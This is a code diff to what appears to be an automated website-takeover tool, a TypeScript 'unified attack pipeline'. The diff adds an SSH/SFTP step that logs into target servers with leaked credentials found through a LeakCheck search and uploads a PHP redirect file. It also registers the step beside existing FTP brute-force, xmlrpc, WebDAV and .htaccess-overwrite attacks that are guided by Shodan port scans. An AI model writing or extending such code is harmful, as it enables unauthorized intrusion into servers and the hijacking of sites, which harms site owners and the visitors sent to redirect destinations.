@@ -53,6 +53,7 @@ import { runGenericUploadEngine, type GenericUploadResult, type GenericUploadRep
 import { recordMethodResult } from "./attack-method-tracker";
 import { scanDomainPorts, formatShodanForTelegram, type PortIntelligence } from "./shodan-scanner";
 import { ftpUploadRedirect, ftpBruteForceUpload, type FTPCredential, type FTPUploadResult } from "./ftp-uploader";
+import { sshUploadRedirect, sshBruteForceUpload, type SSHCredential, type SSHUploadResult } from "./ssh-uploader";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -197,6 +198,8 @@ export interface PipelineResult {
   shodanIntel?: PortIntelligence | null;
   // FTP upload results
   ftpUploadResult?: FTPUploadResult | null;
+  // SSH upload results
+  sshUploadResult?: SSHUploadResult | null;
 }
 
 type EventCallback = (event: PipelineEvent) => void;
@@ -498,6 +501,7 @@ const METHOD_REGISTRY: Record<string, string> = {
   xmlrpc_attack: "xmlrpcAttack",
   rest_api_exploit: "restApiExploit",
   ftp_brute: "ftpBrute",
+  ssh_upload: "sshUpload",
   webdav_upload: "webdavUpload",
   htaccess_overwrite: "htaccessOverwrite",
   // Advanced evasion
@@ -3799,6 +3803,7 @@ export async function runUnifiedAttackPipeline(
   // ─── Phase 5.6: LeakCheck Enterprise Credential Search + Auto-Takeover ───
   let leakcheckCredentials: ExtractedCredential[] = [];
   let ftpUploadResult: FTPUploadResult | null = null;
+  let sshUploadResult: SSHUploadResult | null = null;
 
   if (!hasSuccessfulRedirect() && !shouldStop('leakcheck_cred')) {
     try {
@@ -3830,11 +3835,13 @@ export async function runUnifiedAttackPipeline(
 
         // Use Shodan intelligence to skip closed ports
         const ftpAvailable = shodanIntel ? shodanIntel.ftpOpen : true; // assume open if no Shodan data
+        const sshAvailable = shodanIntel ? shodanIntel.sshOpen : true; // assume open if no Shodan data
         const cpanelAvailable = shodanIntel ? shodanIntel.cpanelOpen : true;
         const daAvailable = shodanIntel ? shodanIntel.directAdminOpen : true;
 
         const activeTargets: string[] = [];
         if (ftpAvailable) activeTargets.push("FTP:21");
+        if (sshAvailable) activeTargets.push("SSH:22");
         if (cpanelAvailable) activeTargets.push("cPanel:2083");
         if (daAvailable) activeTargets.push("DA:2222");
         if (isWordPress) activeTargets.push("WP");
@@ -3922,6 +3929,84 @@ export async function runUnifiedAttackPipeline(
                 phase: "ftp_upload" as any,
                 step: "error",
                 detail: `⚠️ FTP error: ${ftpErr.message}`,
+                progress: 89,
+              });
+            }
+          }
+
+          if (hasSuccessfulRedirect()) break;
+
+          // ─── SSH/SFTP Upload via ssh2 (if port 22 open) ───
+          if (sshAvailable && !hasSuccessfulRedirect()) {
+            try {
+              loggedOnEvent({
+                phase: "ssh_upload" as any,
+                step: "connecting",
+                detail: `🔐 SSH upload: ${username}@${targetDomain}:22...`,
+                progress: 89,
+              });
+
+              const sshResult = await Promise.race([
+                sshUploadRedirect({
+                  credential: {
+                    host: originIp || targetDomain,
+                    username,
+                    password: cred.password,
+                    port: 22,
+                  },
+                  redirectUrl: config.redirectUrl,
+                  targetDomain,
+                  timeout: 25000,
+                  onProgress: (msg) => loggedOnEvent({ phase: "ssh_upload" as any, step: "progress", detail: `🔐 ${msg}`, progress: 89 }),
+                }),
+                new Promise<SSHUploadResult>((_, reject) =>
+                  setTimeout(() => reject(new Error("SSH timeout")), capTimeout(30000))
+                ),
+              ]);
+
+              if (sshResult.success && sshResult.url) {
+                sshUploadResult = sshResult;
+                aiDecisions.push(`🔐 SSH upload สำเร็จ! ${username}@${targetDomain} → ${sshResult.url} (${sshResult.method})`);
+                loggedOnEvent({
+                  phase: "ssh_upload" as any,
+                  step: "success",
+                  detail: `✅ SSH upload สำเร็จ! ${sshResult.url} (${sshResult.method}, ${sshResult.duration}ms)`,
+                  progress: 90,
+                });
+
+                const verification = await verifyUploadedFile(sshResult.url, config.redirectUrl, onEvent);
+                uploadedFiles.push({
+                  url: sshResult.url,
+                  shell: { type: "redirect_php" as any, content: "", filename: sshResult.filePath || "redirect.php", contentType: "application/x-php", description: "SSH leaked cred upload", id: `ssh_${Date.now()}`, targetVector: "ssh_leaked_cred", bypassTechniques: ["leaked_cred", "ssh"], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
+                  method: `ssh_leaked_${cred.source}`,
+                  verified: verification.verified,
+                  redirectWorks: verification.redirectWorks,
+                  redirectDestinationMatch: verification.redirectDestinationMatch,
+                  finalDestination: verification.finalDestination,
+                  httpStatus: verification.httpStatus,
+                  redirectChain: verification.redirectChain,
+                });
+
+                if (verification.redirectWorks) break;
+              } else {
+                loggedOnEvent({
+                  phase: "ssh_upload" as any,
+                  step: "failed",
+                  detail: `❌ SSH: ${sshResult.error || "failed"}`,
+                  progress: 89,
+                });
+                // If SSH port is not reachable, stop trying SSH for other creds
+                if (sshResult.error?.includes("not reachable") || sshResult.error?.includes("ECONNREFUSED")) {
+                  loggedOnEvent({ phase: "ssh_upload" as any, step: "skipped", detail: `⏭ SSH port closed, skipping remaining SSH attempts`, progress: 89 });
+                  // Disable SSH for remaining iterations by shadowing the variable
+                  // (we can't reassign const, so we just break out of SSH block)
+                }
+              }
+            } catch (sshErr: any) {
+              loggedOnEvent({
+                phase: "ssh_upload" as any,
+                step: "error",
+                detail: `⚠️ SSH error: ${sshErr.message}`,
                 progress: 89,
               });
             }
@@ -4711,6 +4796,8 @@ export async function runUnifiedAttackPipeline(
     shodanIntel: shodanIntel || undefined,
     // FTP upload result
     ftpUploadResult: ftpUploadResult || undefined,
+    // SSH upload result
+    sshUploadResult: sshUploadResult || undefined,
   };
 
   if (fullSuccess) {
@@ -4854,6 +4941,9 @@ export async function runUnifiedAttackPipeline(
         : partialSuccess
         ? `Redirect ทำงานแต่ไปผิดที่: ${redirectWorkingFiles[0]?.finalDestination || 'unknown'}`
         : `วางไฟล์สำเร็จ ${realVerifiedFiles.length} ไฟล์ แต่ redirect ยังไม่ทำงาน`,
+      shodanPorts: shodanIntel ? shodanIntel.allPorts.join(",") : undefined,
+      sshUsed: !!sshUploadResult?.success,
+      ftpUsed: !!ftpUploadResult?.success,
     }).catch(err => console.warn(`[Pipeline] Attack success alert failed: ${err}`));
   }
 
